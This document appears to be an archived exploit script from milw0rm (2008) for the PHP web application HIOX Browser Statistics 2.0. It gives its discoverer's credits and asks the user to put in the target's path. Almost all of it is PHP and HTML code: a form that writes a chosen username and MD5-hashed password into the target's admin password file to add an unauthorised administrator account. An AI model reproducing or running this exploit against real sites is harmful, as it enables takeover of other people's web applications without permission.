&lt;?php
@session_start();
?&gt;
&lt;table align=center width=72% height=95% &gt;&lt;tr&gt;&lt;td&gt;
&lt;?php
/*
HIOX Browser Statistics 2.0 Arbitrary Add Admin User Vulnerability  
[~] Discoverd &amp; exploited by Stack
[~]Greeatz All Freaind
[~]Special thnx to Str0ke
 [~] Name Script : HIOX Browser Statistics 2.0
[~] Download : http://www.hscripts.com/scripts/php/downloads/HBS_2_0.zip
You need to change http://localhost/path/ with the link of script it&#039;s very importent
*/
$creat = &quot;true&quot;;
$iswrite = $_POST[&#039;createe&#039;];
if($user==&quot;&quot; &amp;&amp; $pass==&quot;&quot;){
if($iswrite == &quot;creatuser&quot;)
{
    $usname = $_POST[&#039;usernam&#039;];
    $passwrd = md5($_POST[&#039;pword&#039;]);
    if($usname != &quot;&quot; &amp;&amp; $passwrd != &quot;&quot;){
 $filee = &quot;http://localhost/path/admin/passwo.php&quot;;
 $file1 = file($filee);
        $file = fopen($filee,&#039;w&#039;);
        fwrite($file, &quot;&lt;?php \n&quot;);
        fwrite($file, &quot;$&quot;);
        fwrite($file, &quot;user=\&quot;$usname\&quot;;\n&quot;);
        fwrite($file, &quot;$&quot;);
        fwrite($file, &quot;pass=\&quot;$passwrd\&quot;;&quot;);
        fwrite($file, &quot;\n?&gt;&quot;);
        fclose($file);
    $creat = &quot;false&quot;; 
    echo &quot;&lt;div align=center style=&#039;color: green;&#039;&gt;&lt;b&gt;New User Created
  &lt;meta http-equiv=\&quot;refresh\&quot; content=\&quot;2; url=http://localhost/path/admin/index.php\&quot;&gt;
  &lt;br&gt;Please Wait You will be Redirected to Login Page
   &lt;/div&gt;&quot;;
    }
    else{
        echo &quot;&lt;div align=center style=&#039;color: red;&#039;&gt;&lt;b&gt;Enter correct Username or Password &lt;/div&gt;&quot;;
    }
}
if($creat == &quot;true&quot;){
?&gt;
&lt;table align=center valign=center bgcolor=000000 align=center cellpadding=0 style=&quot;border: 1px #000000 solid;&quot;&gt;
&lt;tr width=400 height=20&gt;&lt;td align=center bgcolor=&quot;000000&quot;
style=&quot;color: ffffff; font-family: arial,verdana,san-serif; font-size:13px;&quot;&gt;
 Create New User &lt;/td&gt;&lt;/tr&gt;
     &lt;tr width=400 height=20&gt;&lt;td&gt;
        &lt;form name=setf method=POST action=&lt;?php echo $PHP_SELF;?&gt;&gt;
        &lt;table style=&quot;color:#ffffff; font-family: arial,verdana,san-serif; font-size:13px;&quot;&gt;
        &lt;tr&gt;&lt;td&gt;User Name&lt;/td&gt;&lt;td&gt;&lt;input class=&quot;ta&quot; name=&quot;usernam&quot;  type=text maxlength=20 &gt;
                &lt;/td&gt;&lt;/tr&gt;
        &lt;tr&gt;&lt;td&gt;Password&lt;/td&gt;&lt;td&gt;&lt;input class=&quot;ta&quot; name=&quot;pword&quot; maxlength=20 type=password&gt;&lt;/td&gt;&lt;/tr&gt;
        &lt;input name=&quot;createe&quot; type=hidden value=&quot;creatuser&quot;&gt;&lt;/td&gt;&lt;/tr&gt;
        &lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit value=&quot;create&quot;&gt;&lt;/td&gt;&lt;/tr&gt;
        &lt;/table&gt;
 &lt;/form&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;?php
}
}else{
 echo &quot;&lt;div align=center style=&#039;color: red;&#039;&gt;&lt;b&gt;User Already Exist&lt;/div&gt;&quot;;
}
?&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;

# milw0rm.com [2008-07-30]